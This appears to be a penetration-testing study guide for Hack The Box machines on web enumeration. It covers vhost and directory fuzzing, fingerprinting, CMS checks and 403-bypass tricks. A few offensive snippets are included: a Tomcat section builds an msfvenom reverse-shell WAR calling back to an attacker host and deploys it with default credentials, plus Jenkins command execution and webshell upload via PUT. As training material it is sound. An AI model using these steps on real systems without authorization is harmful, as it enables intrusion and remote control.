# 03 — Web Enumeration

Most Easy/Medium HTB boxes pivot through a web app. Web enumeration is its own discipline. This file goes layer by layer, from "I see port 80" to "I have the foothold."

---

## 1. Layer Model of Web Enumeration

Think of every web target as concentric layers. Skip a layer, miss the bug.

1. **Network/Transport** — TLS cert, HTTP version, headers
2. **Hostnames / virtual hosts** — what names route here?
3. **Technology stack** — what's running? (server, framework, CMS)
4. **Surface** — directories, files, parameters, endpoints
5. **Application logic** — auth, sessions, workflows, state
6. **Data** — what user input flows where? what does the app trust?

The pen tester's job is to walk every layer in order, and feed findings back up.

---

## 2. Layer 1 — Network & Transport

```bash
curl -sIk https://<ip>/                     # headers
openssl s_client -connect <ip>:443 -servername <ip> < /dev/null 2>/dev/null | openssl x509 -noout -text
nmap --script ssl-cert,ssl-enum-ciphers,http-headers -p80,443 <ip>
```

What to extract:
- **Server** header (Apache/2.4.41, nginx/1.18.0, IIS/10.0)
- **X-Powered-By** (PHP/7.4, ASP.NET, Express)
- **Set-Cookie** flags & names (`PHPSESSID`, `JSESSIONID`, `ASPSESSIONID`, `connect.sid` Express)
- TLS cert **CN/SAN** — gives you hostnames you didn't know about
- TLS issuer & dates — internal CAs sometimes leak company names

---

## 3. Layer 2 — Virtual Host & Subdomain Discovery

The single most-missed step on HTB. If a TLS cert says `support.acme.htb` and you only browse the IP, you'll see nothing.

### 3.1 Add hostnames to /etc/hosts
```bash
echo "<ip> acme.htb www.acme.htb support.acme.htb" | sudo tee -a /etc/hosts
```

### 3.2 Vhost fuzz
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://acme.htb -H "Host: FUZZ.acme.htb" \
     -fs <baseline-size>
```
- Baseline: visit `http://acme.htb` and note response size; that's the "no match" size to filter.
- Use `-fc 302` / `-fc 404` etc. instead of `-fs` if size is unstable.

### 3.3 Big subdomain lists
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` — fast first pass
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` — deeper
- `/usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt` — modern, very large

### 3.4 Real-world (not HTB)
```bash
amass enum -d acme.com -passive
subfinder -d acme.com -all -silent
crt.sh: https://crt.sh/?q=%25.acme.com
```

---

## 4. Layer 3 — Technology Fingerprinting

```bash
whatweb -a 3 http://<host>/
nikto -h http://<host>/ -Tuning x4567890ab
```

In the browser:
- **Wappalyzer** extension
- View source → comments, framework signatures, JS bundle paths
- DevTools → Network tab → check headers, cookies, asset paths

Manual hints:
| Sign | Likely stack |
|------|--------------|
| `PHPSESSID` cookie | PHP (Apache/Nginx) |
| `.aspx` URLs, `__VIEWSTATE` form input | ASP.NET (IIS) |
| `JSESSIONID` cookie | Java (Tomcat / Jetty / WildFly) |
| `connect.sid` cookie | Node.js (Express) |
| `csrftoken` cookie | Django |
| `_session_id` rails-flash | Ruby on Rails |
| `XSRF-TOKEN` cookie | Angular default / Laravel |
| `wp-content/`, `wp-includes/` paths | WordPress |
| `/administrator/` | Joomla |
| `/sites/default/` | Drupal |
| `Server: Werkzeug` | Python Flask (debug?) |

Knowing the stack tells you which directories/extensions to fuzz, which CVEs to check, which payloads to weaponize.

---

## 5. Layer 4 — Surface Discovery

### 5.1 Directory & file fuzzing — start here
```bash
feroxbuster -u http://<host>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak,zip,old \
  -t 50 -d 2 \
  -o web/ferox.txt
```

`feroxbuster` recurses by default. For non-recursive (faster, leaner):
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ \
     -u http://<host>/FUZZ -recursion -recursion-depth 2 \
     -e .php,.bak,.old,.zip,.tar.gz \
     -ic -o web/ffuf.json -of json
```

If the server returns 200 for everything (some catch-all apps):
- Filter by **size**: `-fs 1234`
- Filter by **word count**: `-fw 50`
- Filter by **regex**: `-fr "Page not found"`

### 5.2 Wordlist selection — the biggest lever

| Goal | Wordlist |
|------|----------|
| First quick sweep | `Discovery/Web-Content/common.txt` |
| Standard depth | `Discovery/Web-Content/raft-medium-directories.txt` |
| Aggressive | `Discovery/Web-Content/directory-list-2.3-medium.txt` |
| Backup files | `Discovery/Web-Content/Common-PHP-Filenames.txt` + `-x .bak,.zip,.old,.swp,.tar.gz` |
| API endpoints | `Discovery/Web-Content/api/api-endpoints.txt` |
| Specific tech | `Discovery/Web-Content/CMS/<framework>.txt` |

### 5.3 Extensions — match the stack
- PHP: `.php,.php3,.php4,.php5,.phtml,.phar,.bak,.inc`
- ASP.NET: `.aspx,.asp,.ashx,.asmx,.config`
- Java: `.jsp,.jspx,.do,.action,.war`
- Node: `.js,.json` (look for `package.json`, `.env`)
- Python: `.py,.pyc,.wsgi`
- Generic: `.txt,.bak,.old,.zip,.tar.gz,.7z,.git,.svn,.DS_Store,.swp,.~`

### 5.4 The "boring" files that win boxes
Always check, regardless:
- `/robots.txt`, `/sitemap.xml`, `/humans.txt`
- `/.git/`, `/.svn/`, `/.hg/` (source disclosure)
- `/.env`, `/.env.local`, `/config.php.bak`, `/wp-config.php.bak`
- `/server-status`, `/server-info`, `/phpinfo.php`, `/info.php`
- `/.well-known/security.txt`
- `/admin/`, `/login`, `/dashboard`, `/api/`, `/v1/`, `/v2/`, `/graphql`, `/swagger`, `/api-docs`
- `/backup/`, `/backups/`, `/old/`, `/dev/`, `/test/`, `/staging/`
- `/.htaccess`, `/.htpasswd`, `/web.config`
- `/composer.json`, `/composer.lock`, `/package.json`, `/yarn.lock`

### 5.5 Source code disclosure — `.git/` is a goldmine
```bash
# detect
curl -s http://<host>/.git/HEAD
# dump
git-dumper http://<host>/.git/ ./gitdump
cd gitdump && git log --all && git show <commit>
```
Old branches and reverted commits often contain the secret you need.

### 5.6 JS file analysis
JS bundles leak endpoints, API keys, comment trails, hidden flags.
```bash
# find JS
curl -s http://<host>/ | grep -oE '"[^"]+\.js"' | sort -u
# extract URLs/secrets from JS
curl -s http://<host>/static/main.js | grep -oE '"(/[^"]+)"' | sort -u
```
Tools:
- **LinkFinder** (`pip install linkfinder` or GitHub)
- **JSluice** (project discovery)
- **SecretFinder**

### 5.7 Parameter discovery
Once you find a script, fuzz its parameters:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://<host>/page.php?FUZZ=test" -fs <baseline>
# POST
ffuf -w params.txt -u http://<host>/api -X POST \
     -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fs <baseline>
```
**Arjun** is a focused parameter discovery tool:
```bash
arjun -u http://<host>/page.php
```

### 5.8 HTTP methods
```bash
curl -X OPTIONS -i http://<host>/page
nmap --script http-methods --script-args http-methods.url-path='/' -p80,443 <host>
```
PUT enabled? Upload a webshell. TRACE? Possible XST. WebDAV?
```bash
davtest -url http://<host>/
cadaver http://<host>/
```

---

## 6. Layer 5 — Application Logic

Everything above is mechanical. This layer is where pen testers earn their keep.

### 6.1 Authentication surface
- Default creds for the platform (admin/admin, admin/password, root/toor)
- Self-registration → admin features locked behind weak checks
- Password reset → token entropy, host header poisoning
- "Remember me" → predictable token, JWT, cookie
- 2FA → bypass via response tampering, race condition, alternate endpoint
- OAuth / SSO → redirect_uri abuse, state CSRF

### 6.2 Authorization surface
- IDOR — change `/user/123` to `/user/124`
- Forced browsing — `/admin` accessible without role check
- Mass assignment — `?role=admin` accepted in profile update
- JWT — try `alg:none`, weak secret crack, key confusion (RS256→HS256)

### 6.3 Workflow attacks
- Skip step in multi-step process by jumping directly to final URL
- Race conditions on payment / coupon / OTP endpoints
- Replay successful response for another user

### 6.4 Hidden inputs / debug routes
```bash
# inspect all hidden inputs in a page
curl -s http://<host>/login | grep -i 'type="hidden"'
# common debug routes
for p in /debug /actuator /actuator/health /actuator/env /trace /metrics /api-docs /swagger-ui /swagger-ui.html /v2/api-docs; do
  echo "[$p]"; curl -s -o /dev/null -w "%{http_code}\n" http://<host>$p
done
```
Spring Boot Actuator endpoints exposed → potential RCE / config dump.

---

## 7. Layer 6 — Data Flow

Trace where input lands. For every input, ask:

| Where input lands | Vuln class |
|-------------------|------------|
| HTML body | XSS |
| Attribute value | XSS (different escape) |
| JS string | DOM XSS |
| SQL query | SQLi |
| OS command | Command injection |
| File path | LFI / Path traversal |
| File include | LFI / RFI |
| Server-side render template | SSTI |
| URL fetched server-side | SSRF |
| XML parser | XXE |
| Deserialization | Insecure deserialization |
| Redirect Location header | Open redirect / SSRF |
| Filename for upload | Path traversal write |
| LDAP query | LDAP injection |
| NoSQL query | NoSQL injection |
| Header reflected | Cache poisoning |

For each input, test **with a marker first** (`'`, `xss-test`, `${7*7}`, etc.) before bringing real payloads.

---

## 8. CMS-Specific Enumeration

### 8.1 WordPress
```bash
wpscan --url http://<host> -e ap,at,u --plugins-detection aggressive --api-token <token>
# enumerate users by ID
for i in $(seq 1 10); do curl -s "http://<host>/?author=$i" | grep -oP 'author/\K[^/"]+'; done
# xmlrpc
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://<host>/xmlrpc.php
```
Goldmines: `wp-config.php`, plugin RCEs (consult `wpscan` output), `xmlrpc.php` brute amplification.

### 8.2 Joomla
```bash
joomscan -u http://<host>
# config: /configuration.php (when readable via LFI)
```

### 8.3 Drupal
```bash
droopescan scan drupal -u http://<host>
# Drupalgeddon family of CVEs by version
```

### 8.4 Tomcat
```bash
curl -s http://<host>:8080/manager/html       # 401 = exists
# common: tomcat:tomcat, admin:admin, role1:role1
# deploy WAR shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<atk> LPORT=4444 -f war > shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<host>:8080/manager/text/deploy?path=/shell"
curl http://<host>:8080/shell/
```

### 8.5 Jenkins
- `/script` Groovy console → RCE if authenticated
- `/manage` admin
- Default: anonymous read access often left on
```groovy
// in /script:
"id".execute().text
```

### 8.6 phpMyAdmin
- `/phpmyadmin/`, `/pma/`, `/phpMyAdmin/`
- Try root with no password (LAMP defaults)
- After auth: SQL → file write to webroot for shell

### 8.7 Git, Gitea, GitLab
```bash
# Gitea version: /api/v1/version
curl http://<host>/api/v1/version
# repos: /explore/repos
```

---

## 9. SSL/TLS Reconnaissance

```bash
sslscan <host>
testssl.sh <host>
nmap --script ssl-* -p443 <host>
```
Findings:
- Heartbleed (`CVE-2014-0160`) — unlikely modern, possible on legacy boxes
- Weak cipher suites — info, not exploit
- Cert SAN entries — *always* check; reveals hostnames

---

## 10. WebSocket / GraphQL / gRPC

### 10.1 WebSockets
- Burp's WebSocket history
- Look for auth tokens passed via initial frame
- Test injection in messages

### 10.2 GraphQL
```bash
curl -X POST -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name}}}"}' http://<host>/graphql
# Tools
inql -t http://<host>/graphql
```
Introspection enabled = full schema → look for queries that bypass auth.

### 10.3 gRPC
- Service reflection: `grpcurl -plaintext <host>:<port> list`
- Often exposed without auth in lab/test envs.

---

## 11. Burp Suite Workflow

A practical Burp loop for HTB:

1. **Configure browser proxy** — FoxyProxy → 127.0.0.1:8080.
2. **Browse the app casually** — login, sign up, click around. Burp records traffic.
3. **Right-click target host → "Add to scope"** — keeps history clean.
4. **Proxy → HTTP history** — review every request methodically.
5. **Repeater** for any interesting endpoint — retry with tampered params.
6. **Intruder** for fuzzing/brute (free is rate-limited; for serious fuzzing, use ffuf).
7. **Decoder** for base64, URL, hex.
8. **Comparer** to diff two responses.
9. **Sequencer** to assess token entropy.
10. **Extender / BApp Store** — JWT Editor, Logger++, Param Miner, Active Scan++.

Save your Burp project file per box.

---

## 12. Common HTTP Status Code Tells

| Code | Meaning in enum context |
|------|------------------------|
| 200 | Resource exists, served |
| 301 / 302 | Redirect — often interesting (login wall, vhost, app root) |
| 401 | Auth required (Basic / Digest) |
| 403 | Exists but forbidden — sometimes bypassable (see §13) |
| 404 | Not found (or fake — check size) |
| 405 | Method not allowed — try other methods |
| 500 | Server error — sometimes useful (debug info, stack traces) |
| 502 / 503 | Backend down or rate-limit |

---

## 13. 403 Bypass Tricks

When `/admin` → 403:
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<host>/admin
# tricks
for p in '/admin' '/admin/' '/admin/.' '/admin/..;/' '/admin..;/' '/admin%20' '/admin%09' \
         '/Admin' '/ADMIN' '/%2e/admin' '//admin' '/./admin' '/admin.json' '/admin.html'; do
  echo "[$p]"; curl -s -o /dev/null -w "%{http_code}\n" "http://<host>$p"
done
# header tricks
for h in 'X-Original-URL: /admin' 'X-Rewrite-URL: /admin' 'X-Forwarded-For: 127.0.0.1' \
         'X-Real-IP: 127.0.0.1' 'X-Custom-IP-Authorization: 127.0.0.1' \
         'Referer: http://<host>/admin'; do
  echo "[$h]"; curl -s -o /dev/null -w "%{http_code}\n" -H "$h" http://<host>/admin
done
```

Tools: `byp4xx`, `dontgo403`, `forbidden`.

---

## 14. Rate Limits & Honeypots

- Many boxes have no rate limit — fuzz freely.
- Real targets: throttle (`-t 10`), randomize delay, rotate User-Agent.
- If a wordlist hit gives you "200 OK with login on every URL" → it's a wildcard handler. Filter by size/word/regex.
- A scanner triggering an obvious "catch" page (e.g., `/admin/super-secret`) on tier-2 wordlists is sometimes a honeypot for noisy scanners.

---

## 15. Web Enum Anti-Patterns

- Running `nikto` and stopping there.
- Fuzzing only `/` and not subdirectories.
- Skipping vhost fuzz when an IP returns a default Apache page.
- Ignoring 403s. (Bypassable, often.)
- Ignoring 401s. (Default creds, often.)
- Using `common.txt` against a custom enterprise app and concluding "nothing here."
- Not checking JS files.
- Not reading the source code.
- Not opening the box description tab.

---

## 16. The "I'm Stuck on Web" Re-enumerate Checklist

When the foothold isn't coming:

- [ ] Ran a full-port scan, including UDP?
- [ ] Added every cert SAN / response hostname to /etc/hosts?
- [ ] Vhost-fuzzed each hostname?
- [ ] Used at least 3 different directory wordlists?
- [ ] Fuzzed file extensions matching the stack?
- [ ] Looked for `.git/`, `.env`, backup files?
- [ ] Read every JS file?
- [ ] Inspected every form / hidden input?
- [ ] Tried OPTIONS, PUT, TRACE, MKCOL?
- [ ] Tried 403/401 bypasses?
- [ ] Searched the running framework + version on Exploit-DB / GitHub?
- [ ] Tried *creating an account* if signup exists?
- [ ] Confirmed cookies are what they claim (decoded JWTs etc.)?

If you've done all 13 and still nothing — the bug is in workflow logic. Re-walk every multi-step flow with a hostile eye.

---

*Web is layered. Enumerate every layer.*
